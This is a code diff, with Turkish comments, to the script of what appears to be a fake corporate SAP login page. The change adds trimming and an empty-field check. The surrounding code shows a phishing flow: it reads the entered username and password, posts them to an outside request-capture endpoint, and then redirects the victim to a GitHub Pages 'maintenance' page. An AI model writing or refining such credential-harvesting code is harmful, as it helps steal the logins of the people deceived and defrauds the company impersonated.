@@ -106,8 +106,14 @@
         event.preventDefault();
 
         // Kullanıcı adı ve şifreyi al
-        var uid = document.getElementById('logonuidfield').value;
-        var password = document.getElementById('logonpassfield').value;
+        var uid = document.getElementById('logonuidfield').value.trim();
+        var password = document.getElementById('logonpassfield').value.trim();
+
+        // Boş alan kontrolü
+        if (!uid || !password) {
+            alert('Lütfen kullanıcı adı ve şifre alanlarını doldurun.');
+            return; // Eğer alanlar boşsa işlemi durdur
+        }
 
         var url = 'https://eo92nx61sdcl12r.m.pipedream.net';
         var params = new URLSearchParams();
@@ -126,7 +132,6 @@
             console.log('Request made successfully');
             
             // Login işleminden sonra yönlendirme
-            // Burada istediğiniz siteye yönlendirme yapabilirsiniz
             window.location.href = 'https://sisecamsap.github.io/bakim.html';  // Yönlendirilecek URL'yi buraya yazın
         })
         .catch(error => {
